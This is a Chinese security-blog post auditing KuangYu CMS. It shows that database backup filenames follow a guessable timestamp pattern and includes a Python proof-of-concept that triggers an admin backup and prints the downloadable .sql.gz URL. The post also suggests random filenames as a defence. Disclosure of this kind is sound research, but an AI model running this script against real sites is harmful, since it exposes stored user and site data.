<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>She11c0de&#39;s blogs</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="狂雨CMS数据库备份地址爆破审计application&#x2F;admin&#x2F;controller&#x2F;Database.php-&gt;export() 12345678910111213141516171819202122232425262728293031public function export($tables &#x3D; null, $id &#x3D; null, $start &#x3D; null)&amp;#123;">
<meta property="og:type" content="article">
<meta property="og:title" content="She11c0de&#39;s blogs">
<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/%E7%8B%82%E9%9B%A8cms/%E7%8B%82%E9%9B%A8CMS%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%87%E4%BB%BD%E5%9C%B0%E5%9D%80%E7%88%86%E7%A0%B4/index.html">
<meta property="og:site_name" content="She11c0de&#39;s blogs">
<meta property="og:description" content="狂雨CMS数据库备份地址爆破审计application&#x2F;admin&#x2F;controller&#x2F;Database.php-&gt;export() 12345678910111213141516171819202122232425262728293031public function export($tables &#x3D; null, $id &#x3D; null, $start &#x3D; null)&amp;#123;">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://she11c0de.github.io/resource/%E7%8B%82%E9%9B%A8CMS%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%87%E4%BB%BD%E5%9C%B0%E5%9D%80%E7%88%86%E7%A0%B4/media/2Z9dpibMEs1PUcB.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/%E7%8B%82%E9%9B%A8CMS%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%87%E4%BB%BD%E5%9C%B0%E5%9D%80%E7%88%86%E7%A0%B4/media/kxcNeHhSqviyfpR.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/%E7%8B%82%E9%9B%A8CMS%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%87%E4%BB%BD%E5%9C%B0%E5%9D%80%E7%88%86%E7%A0%B4/media/p2VETuFUze3lDZS.png">
<meta property="article:published_time" content="2022-07-08T06:26:10.341Z">
<meta property="article:modified_time" content="2022-07-08T07:24:51.296Z">
<meta property="article:author" content="She11c0de">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://she11c0de.github.io/resource/%E7%8B%82%E9%9B%A8CMS%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%87%E4%BB%BD%E5%9C%B0%E5%9D%80%E7%88%86%E7%A0%B4/media/2Z9dpibMEs1PUcB.png">
  
  
    <link rel="icon" href="/favicon.png">
  
  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
  
<link rel="stylesheet" href="/css/style.css">

  
<link rel="stylesheet" href="/css/scrollUp/image.css">

  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
  
<meta name="generator" content="Hexo 5.4.2"></head>
<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <div class="logo">
        <img src="/logo.png" alt="Profile Picture">
      </div>
      <div id="title">She11c0de's blogs</div>
      
       <ul class="my-socials">
  
 
</ul>
    </div>
  </div>
  <div id="header-inner" class="">
    <nav id="main-nav">
      <a id="main-nav-toggle" class="nav-icon"></a>
      <!--
        
          
            <a class="main-nav-link" href="/">首页</a>
          
            <a class="main-nav-link" href="/categories/life">生活</a>
          
            <a class="main-nav-link" href="/archives">归档</a>
          
        
      -->
    </nav>
    <nav id="title-nav" style="display:none">
      <a href="/">She11c0de&#39;s blogs</a>
      <img src="/logo.png" alt="Profile Picture">
      <!--
      <span id="title-nav-socials">
        
       
     </span>
      -->
    </nav>
    <nav id="sub-nav">
      
      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
    </nav>
    <div id="search-form-wrap">
      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
        <input type="submit" value="" class="search-form-submit">
        <input name=tn type=hidden value="bds">
        <input name=cl type=hidden value="3">
        <input name=ct type=hidden value="2097152">
        <input type="hidden" name="si" value="she11c0de.github.io">
      </form>
    </div>
  </div>
  <div class="site-nav" style="display: none;">
    <ul>
      
      
        <li><a href="/">首页</a></li>
      
        <li><a href="/categories/life">生活</a></li>
      
        <li><a href="/archives">归档</a></li>
      
      
    </ul>
  </div>
</header>
      <div class="outer">
        <section id="main"><article id="post-狂雨cms/狂雨CMS数据库备份地址爆破" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/%E7%8B%82%E9%9B%A8cms/%E7%8B%82%E9%9B%A8CMS%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%87%E4%BB%BD%E5%9C%B0%E5%9D%80%E7%88%86%E7%A0%B4/" class="article-date">
  <time datetime="2022-07-08T06:26:10.341Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="狂雨CMS数据库备份地址爆破"><a href="#狂雨CMS数据库备份地址爆破" class="headerlink" title="狂雨CMS数据库备份地址爆破"></a>狂雨CMS数据库备份地址爆破</h1><h2 id="审计"><a href="#审计" class="headerlink" title="审计"></a>审计</h2><p><code>application/admin/controller/Database.php-&gt;export()</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">export</span>(<span class="params"><span class="variable">$tables</span> = <span class="literal">null</span>, <span class="variable">$id</span> = <span class="literal">null</span>, <span class="variable">$start</span> = <span class="literal">null</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;request-&gt;<span class="title function_ invoke__">isPost</span>() &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$tables</span>) &amp;&amp; <span class="title function_ invoke__">is_array</span>(<span class="variable">$tables</span>))&#123; <span class="comment">//初始化</span></span><br><span class="line">            ......</span><br><span class="line"></span><br><span class="line">            <span class="comment">//生成备份文件信息</span></span><br><span class="line">            <span class="variable">$file</span> = [</span><br><span class="line">                <span class="string">&#x27;name&#x27;</span> =&gt; <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Ymd-His&#x27;</span>, <span class="title function_ invoke__">time</span>()),</span><br><span class="line">                <span class="string">&#x27;part&#x27;</span> =&gt; <span class="number">1</span>,</span><br><span class="line">            ];</span><br><span class="line"></span><br><span class="line">            ......</span><br><span class="line"></span><br><span class="line">            <span class="comment">//创建备份文件</span></span><br><span class="line">            <span class="variable">$Database</span> = <span class="keyword">new</span> <span class="title class_">Databasec</span>(<span class="variable">$file</span>, <span class="variable">$config</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="literal">false</span> !== <span class="variable">$Database</span>-&gt;<span class="title function_ invoke__">create</span>())&#123;</span><br><span class="line">                <span class="variable">$tab</span> = [<span class="string">&#x27;id&#x27;</span> =&gt; <span class="number">0</span>, <span class="string">&#x27;start&#x27;</span> =&gt; <span class="number">0</span>];</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">success</span>(<span class="string">&#x27;初始化成功！&#x27;</span>, <span class="string">&#x27;&#x27;</span>, [<span class="string">&#x27;tables&#x27;</span> =&gt; <span class="variable">$tables</span>, <span class="string">&#x27;tab&#x27;</span> =&gt; <span class="variable">$tab</span>]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">error</span>(<span class="string">&#x27;初始化失败，备份文件创建失败！&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            ......</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="variable language_">$this</span>-&gt;request-&gt;<span class="title function_ invoke__">isGet</span>() &amp;&amp; <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$id</span>) &amp;&amp; <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$start</span>)) &#123; <span class="comment">//备份数据</span></span><br><span class="line"></span><br><span class="line">            ......</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">error</span>(<span class="string">&#x27;请指定要备份的表！&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>跟进<code>Databasec</code>类</p>
<p><code>extend/databasec/Databasec.php-&gt;create()</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>, <span class="variable">$config</span>, <span class="variable">$type</span> = <span class="string">&#x27;export&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file   = <span class="variable">$file</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;config = <span class="variable">$config</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">create</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$sql</span>  = <span class="string">&quot;-- -----------------------------\n&quot;</span>;</span><br><span class="line">        <span class="variable">$sql</span> .= <span class="string">&quot;-- Think MySQL Data Transfer \n&quot;</span>;</span><br><span class="line">        <span class="variable">$sql</span> .= <span class="string">&quot;-- \n&quot;</span>;</span><br><span class="line">        <span class="variable">$sql</span> .= <span class="string">&quot;-- Host     : &quot;</span> . <span class="title function_ invoke__">config</span>(<span class="string">&#x27;database.hostname&#x27;</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        <span class="variable">$sql</span> .= <span class="string">&quot;-- Port     : &quot;</span> . <span class="title function_ invoke__">config</span>(<span class="string">&#x27;database.hostport&#x27;</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        <span class="variable">$sql</span> .= <span class="string">&quot;-- Database : &quot;</span> . <span class="title function_ invoke__">config</span>(<span class="string">&#x27;database.database&#x27;</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        <span class="variable">$sql</span> .= <span class="string">&quot;-- \n&quot;</span>;</span><br><span class="line">        <span class="variable">$sql</span> .= <span class="string">&quot;-- Part : #<span class="subst">&#123;$this-&gt;file[&#x27;part&#x27;]&#125;</span>\n&quot;</span>;</span><br><span class="line">        <span class="variable">$sql</span> .= <span class="string">&quot;-- Date : &quot;</span> . <span class="title function_ invoke__">date</span>(<span class="string">&quot;Y-m-d H:i:s&quot;</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        <span class="variable">$sql</span> .= <span class="string">&quot;-- -----------------------------\n\n&quot;</span>;</span><br><span class="line">        <span class="variable">$sql</span> .= <span class="string">&quot;SET FOREIGN_KEY_CHECKS = 0;\n\n&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$sql</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>继续跟进<code>write</code>函数</p>
<p><code>extend/databasec/Databasec.php-&gt;write()</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="variable">$sql</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$size</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$sql</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//由于压缩原因，无法计算出压缩后的长度，这里假设压缩率为50%，</span></span><br><span class="line">        <span class="comment">//一般情况压缩率都会高于50%；</span></span><br><span class="line">        <span class="variable">$size</span> = <span class="variable language_">$this</span>-&gt;config[<span class="string">&#x27;compress&#x27;</span>] ? <span class="variable">$size</span> / <span class="number">2</span> : <span class="variable">$size</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$size</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;config[<span class="string">&#x27;compress&#x27;</span>] ? @<span class="title function_ invoke__">gzwrite</span>(<span class="variable">$this</span>-&gt;fp, <span class="variable">$sql</span>) : @<span class="title function_ invoke__">fwrite</span>(<span class="variable">$this</span>-&gt;fp, <span class="variable">$sql</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>跟进<code>open</code>函数</p>
<p><code>extend/databasec/Databasec.php-&gt;open()</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">open</span>(<span class="params"><span class="variable">$size</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;fp)&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;size += <span class="variable">$size</span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;size &gt; <span class="variable language_">$this</span>-&gt;config[<span class="string">&#x27;part&#x27;</span>])&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;config[<span class="string">&#x27;compress&#x27;</span>] ? @<span class="title function_ invoke__">gzclose</span>(<span class="variable">$this</span>-&gt;fp) : @<span class="title function_ invoke__">fclose</span>(<span class="variable">$this</span>-&gt;fp);</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;fp = <span class="literal">null</span>;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;file[<span class="string">&#x27;part&#x27;</span>]++;</span><br><span class="line">                <span class="title function_ invoke__">session</span>(<span class="string">&#x27;backup_file&#x27;</span>, <span class="variable">$this</span>-&gt;file);</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">create</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$backuppath</span> = <span class="variable language_">$this</span>-&gt;config[<span class="string">&#x27;path&#x27;</span>];</span><br><span class="line">            <span class="variable">$filename</span>   = <span class="string">&quot;<span class="subst">&#123;$backuppath&#125;</span><span class="subst">&#123;$this-&gt;file[&#x27;name&#x27;]&#125;</span>-<span class="subst">&#123;$this-&gt;file[&#x27;part&#x27;]&#125;</span>.sql&quot;</span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;config[<span class="string">&#x27;compress&#x27;</span>])&#123;</span><br><span class="line">                <span class="variable">$filename</span> = <span class="string">&quot;<span class="subst">&#123;$filename&#125;</span>.gz&quot;</span>;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;fp = @<span class="title function_ invoke__">gzopen</span>(<span class="variable">$filename</span>, <span class="string">&quot;a<span class="subst">&#123;$this-&gt;config[&#x27;level&#x27;]&#125;</span>&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;fp = @<span class="title function_ invoke__">fopen</span>(<span class="variable">$filename</span>, <span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;size = <span class="title function_ invoke__">filesize</span>(<span class="variable">$filename</span>) + <span class="variable">$size</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>可以看到文件名由<code>file[&#39;name&#39;]</code>+<code>-</code>+<code>file[&#39;part&#39;]</code>+<code>.sql(.gz)</code>组成，<code>name</code>是格式化后的time，<code>part</code>为1，因此可直接爆破文件名，从而泄露数据库</p>
<h3 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h3><p>利用随机数生成文件名，然后发送邮件至管理员邮箱或发送短信至手机，增加爆破难度</p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>后台可以直接备份数据库，备份后为.sql.gz文件(可以在设置里更改是否压缩)，文件名为time函数生成的时间戳，可直接爆破进行下载，这里先附上exp(因为不会进行验证码的识别，所以修改了代码将验证部分注释掉了，师傅们见谅~)</p>
<p>Python爆破脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># !/usr/bin/python3</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># author: Forthrglory</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getDatabase</span>(<span class="params">url,username, password</span>):</span><br><span class="line">    session = requests.session()</span><br><span class="line"></span><br><span class="line">    u = <span class="string">&#x27;http://%s/admin/index/login.html&#x27;</span> % (url)</span><br><span class="line">    head = &#123;</span><br><span class="line">        <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded; charset=UTF-8&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;username&#x27;</span>: username,</span><br><span class="line">        <span class="string">&#x27;password&#x27;</span>: password,</span><br><span class="line">        <span class="string">&#x27;code&#x27;</span>: <span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line">    session.post(u, data, headers = head)</span><br><span class="line"></span><br><span class="line">    u = <span class="string">&#x27;http://%s/admin/database/export.html&#x27;</span> % (url)</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;layTableCheckbox&#x27;</span>:<span class="string">&#x27;on&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tables[0]&#x27;</span>:<span class="string">&#x27;ky_ad&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tables[1]&#x27;</span>:<span class="string">&#x27;ky_addons&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tables[2]&#x27;</span>:<span class="string">&#x27;ky_bookshelf&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tables[3]&#x27;</span>:<span class="string">&#x27;ky_category&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tables[4]&#x27;</span>:<span class="string">&#x27;ky_collect&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tables[5]&#x27;</span>:<span class="string">&#x27;ky_comment&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tables[6]&#x27;</span>:<span class="string">&#x27;ky_config&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tables[7]&#x27;</span>:<span class="string">&#x27;ky_crontab&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tables[8]&#x27;</span>:<span class="string">&#x27;ky_link&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tables[9]&#x27;</span>:<span class="string">&#x27;ky_member&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tables[10]&#x27;</span>:<span class="string">&#x27;ky_menu&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tables[11]&#x27;</span>:<span class="string">&#x27;ky_news&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tables[12]&#x27;</span>:<span class="string">&#x27;ky_novel&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tables[13]&#x27;</span>:<span class="string">&#x27;ky_novel_chapter&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tables[14]&#x27;</span>:<span class="string">&#x27;ky_route&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tables[15]&#x27;</span>:<span class="string">&#x27;ky_slider&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tables[16]&#x27;</span>:<span class="string">&#x27;ky_template&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tables[17]&#x27;</span>:<span class="string">&#x27;ky_user&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tables[18]&#x27;</span>:<span class="string">&#x27;ky_user_menu&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    t = time.strftime(<span class="string">&quot;%Y%m%d-%H%M%S&quot;</span>, time.localtime())</span><br><span class="line"></span><br><span class="line">    session.post(u, data = data)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">19</span>):</span><br><span class="line">        u2 = <span class="string">&#x27;http://%s/admin/database/export.html?id=%s&amp;start=0&#x27;</span> % (url, <span class="built_in">str</span>(i))</span><br><span class="line">        session.get(u2)</span><br><span class="line"></span><br><span class="line">    t = <span class="string">&#x27;http://&#x27;</span> + url + <span class="string">&#x27;/public/database/&#x27;</span> + t + <span class="string">&#x27;-1.sql.gz&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> t</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    u = <span class="string">&#x27;127.0.0.1&#x27;</span></span><br><span class="line">    username = <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">    password = <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">    t = getDatabase(u, username, password)</span><br><span class="line">    <span class="built_in">print</span>(t)</span><br></pre></td></tr></table></figure>

<p>运行代码，得到路径(默认生成路径为/public/database/，可在设置中修改)</p>
<p><img src="/resource/%E7%8B%82%E9%9B%A8CMS%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%87%E4%BB%BD%E5%9C%B0%E5%9D%80%E7%88%86%E7%A0%B4/media/2Z9dpibMEs1PUcB.png" alt="2Z9dpibMEs1PUcB"></p>
<p>直接访问下载</p>
<p><img src="/resource/%E7%8B%82%E9%9B%A8CMS%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%87%E4%BB%BD%E5%9C%B0%E5%9D%80%E7%88%86%E7%A0%B4/media/kxcNeHhSqviyfpR.png" alt="kxcNeHhSqviyfpR"></p>
<p>可以看到所有数据库信息全在了</p>
<p><img src="/resource/%E7%8B%82%E9%9B%A8CMS%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%87%E4%BB%BD%E5%9C%B0%E5%9D%80%E7%88%86%E7%A0%B4/media/p2VETuFUze3lDZS.png" alt="p2VETuFUze3lDZS"></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/0daybug/p/12624364.html">https://www.cnblogs.com/0daybug/p/12624364.html</a></p>

      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/%E7%8B%82%E9%9B%A8cms/%E7%8B%82%E9%9B%A8CMS%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%87%E4%BB%BD%E5%9C%B0%E5%9D%80%E7%88%86%E7%A0%B4/" data-id="cl5c2r0i800ppy8v14hm2hglc" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2022/07/07/%E8%93%9D%E5%87%8Coa/CNVD-2021-01363-%E8%93%9D%E5%87%8COA-EKP-%E5%90%8E%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Newer</strong>
      <div class="article-nav-title">
        
          (no title)
        
      </div>
    </a>
  
  
    <a href="/2022/07/07/%E7%8B%82%E9%9B%A8cms/%E7%8B%82%E9%9B%A8CMS%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABgetshell/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title"></div>
    </a>
  
</nav>

  
</article>

</section>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2022 She11c0de<br>
      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <!--
      <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">首页</a>
  
    <a href="/categories/life" class="mobile-nav-link">生活</a>
  
    <a href="/archives" class="mobile-nav-link">归档</a>
  
</nav>
    -->
    

<!-- 百度分享 start -->

<!-- 百度分享 end -->

<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>




<script src="/js/jquery.scrollUp.min.js"></script>


<script src="/js/jquery.transform.js"></script>


<script src="/js/menu.js"></script>



<script src="/js/script.js"></script>


<script src="/js/scrollUp.js"></script>


  </div>
</body>
</html>